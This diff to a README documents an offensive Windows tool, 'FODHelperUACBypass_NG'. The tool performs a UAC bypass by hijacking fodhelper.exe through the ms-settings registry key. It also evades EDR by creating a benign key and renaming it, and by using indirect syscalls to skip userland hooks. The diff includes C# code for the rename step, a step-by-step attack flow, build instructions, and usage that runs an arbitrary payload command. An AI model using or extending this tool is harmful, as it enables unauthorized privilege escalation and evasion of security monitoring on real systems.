@@ -1,7 +1,7 @@
-# RegRenameKey Implementation in regfod
+# RegRenameKey Implementation in FODHelperUACBypass_NG
 
 ## Overview
-This project demonstrates using the Win32 `RegRenameKey` API for atomically renaming registry keys as part of a UAC bypass technique (fodhelper.exe hijack).
+This project demonstrates using the Win32 `RegRenameKey` API for atomically renaming registry keys as part of a UAC bypass technique (fodhelper.exe hijack). All other registry operations (create, set value, delete, open) use **indirect syscalls** via dynamically generated assembly stubs — see [INDIRECT-SYSCALLS.md](INDIRECT-SYSCALLS.md) for full details.
 
 ## Implementation Strategy
 
@@ -33,32 +33,44 @@ TempApp{GUID} -> ms-settings
 ## Code Structure
 
 ### Helpers.cs - RenameRegistryKey()
+
+The rename step is the only operation that uses Win32 P/Invoke (`advapi32.dll`). Every other registry operation goes through indirect syscalls in `Native.cs`.
+
 ```csharp
-// Win32 APIs used
-[DllImport("advapi32.dll")]
+// Win32 APIs (P/Invoke) — only used for the rename step
+[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
 private static extern int RegRenameKey(IntPtr hKey, string lpSubKeyName, string lpNewKeyName);
 
-[DllImport("advapi32.dll")]
-private static extern int RegOpenKeyEx(IntPtr hKey, string lpSubKey, uint ulOptions, 
+[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+private static extern int RegOpenKeyEx(IntPtr hKey, string lpSubKey, uint ulOptions,
                                         uint samDesired, out IntPtr phkResult);
 
-// Implementation
+[DllImport("advapi32.dll", SetLastError = true)]
+private static extern int RegCloseKey(IntPtr hKey);
+
 public static bool RenameRegistryKey(string keyPath, string newName)
 {
-    // 1. Parse key path to extract parent and old name
-    string parentPath = "Software\\Classes";  // e.g.
-    string oldKeyName = "TempApp12345678";    // e.g.
-    
-    // 2. Open parent key with Win32 API
-    RegOpenKeyEx(HKEY_CURRENT_USER, parentPath, 0, 
-                 KEY_WRITE | KEY_CREATE_SUB_KEY, out parentHandle);
-    
-    // 3. Rename using Win32 RegRenameKey
-    int result = RegRenameKey(parentHandle, oldKeyName, newName);
-    
-    // 4. Cleanup
-    RegCloseKey(parentHandle);
-    return result == 0;
+    IntPtr parentHandle = IntPtr.Zero;
+    try
+    {
+        // 1. Parse key path to extract parent and old name
+        int lastBackslash = keyPath.LastIndexOf('\\');
+        string parentPath = keyPath.Substring(0, lastBackslash);   // e.g. "Software\\Classes"
+        string oldKeyName = keyPath.Substring(lastBackslash + 1);  // e.g. "TempApp{GUID}"
+
+        // 2. Open parent key with Win32 API
+        int result = RegOpenKeyEx(HKEY_CURRENT_USER, parentPath, 0,
+                     KEY_WRITE | KEY_CREATE_SUB_KEY, out parentHandle);
+        if (result != 0) return false;
+
+        // 3. Atomically rename using Win32 RegRenameKey
+        result = RegRenameKey(parentHandle, oldKeyName, newName);
+        return result == 0;
+    }
+    finally
+    {
+        if (parentHandle != IntPtr.Zero) RegCloseKey(parentHandle);
+    }
 }
 ```
 
@@ -91,47 +103,49 @@ LSTATUS RegRenameKey(
 
 ## Advantages of This Approach
 
-1. **Atomic Operation**: RegRenameKey is atomic - no race condition window
-2. **EDR Evasion**: Creating benign key first avoids detection patterns
-3. **Win32 API**: Uses standard Windows API (less suspicious than direct syscalls for rename)
-4. **Indirect Syscalls**: Still uses indirect syscalls for create/delete operations
+1. **Atomic Operation**: RegRenameKey is atomic — no race condition window
+2. **EDR Evasion**: Creating a benign key first avoids detection patterns that trigger on `ms-settings` key creation
+3. **Hybrid API Strategy**: Uses Win32 `RegRenameKey` only for the rename (no NT equivalent exposed); all other registry operations use indirect syscalls to bypass userland hooks
+4. **Indirect Syscalls**: `NtCreateKey`, `NtSetValueKey`, `NtDeleteKey`, `NtOpenKey`, `NtClose`, and `NtDelayExecution` all go through dynamically generated assembly stubs that jump to the `syscall` instruction inside `ntdll.dll` (see [INDIRECT-SYSCALLS.md](INDIRECT-SYSCALLS.md))
 
 ## Program Flow
 
 ```
-[Create] TempApp{GUID}\Shell\Open\command (NtCreateKey - indirect syscall)
+[Create] TempApp{GUID}\Shell\Open\command (NtCreateKey — indirect syscall)
     ↓
-[Set Values] DelegateExecute="" and default=payload (NtSetValueKey)
+[Set Values] DelegateExecute="" and default=payload (NtSetValueKey — indirect syscall)
     ↓
-[Rename] TempApp{GUID} -> ms-settings (RegRenameKey - Win32 API)
-    ↓
-[Wait] 10 seconds (NtDelayExecution)
+[Rename] TempApp{GUID} -> ms-settings (RegRenameKey — Win32 API)
     ↓
 [Execute] fodhelper.exe (ShellExecuteEx)
     ↓
-[Wait] 5 seconds (NtDelayExecution)
+[Wait] 5 seconds (NtDelayExecution — indirect syscall)
     ↓
-[Cleanup] Delete ms-settings\Shell\Open\command (NtDeleteKey)
+[Cleanup] Delete ms-settings\Shell\Open\command (NtDeleteKey — indirect syscall)
 ```
 
 ## Building the Project
 
 ```powershell
-& "C:\Program Files\Microsoft Visual Studio\18\Community\MSBuild\Current\Bin\MSBuild.exe" `
-  C:\git\warp\regfod\regfod\regfod.csproj `
-  /p:Configuration=Release /p:Platform=x64
+# Using MSBuild
+msbuild FODHelperUACBypass_NG\FODHelperUACBypass_NG.csproj /p:Configuration=Release /p:Platform=x64
+
+# Or open FODHelperUACBypass_NG.sln in Visual Studio and build Release|x64
 ```
 
-Output: `C:\git\warp\regfod\regfod\bin\x64\Release\regfod.exe`
+Output: `FODHelperUACBypass_NG\bin\x64\Release\FODHelperUACBypass_NG.exe`
 
 ## Usage
 
 ```powershell
-# Run the UAC bypass
-.\regfod.exe
+# Run the UAC bypass (default payload)
+.\FODHelperUACBypass_NG.exe
 
-# Run syscall tests
-.\regfod.exe -test
+# Run with a custom payload command
+.\FODHelperUACBypass_NG.exe "cmd.exe /c whoami > c:\temp\out.txt"
+
+# Run syscall diagnostic tests
+.\FODHelperUACBypass_NG.exe -test
 ```
 
 ## Error Handling
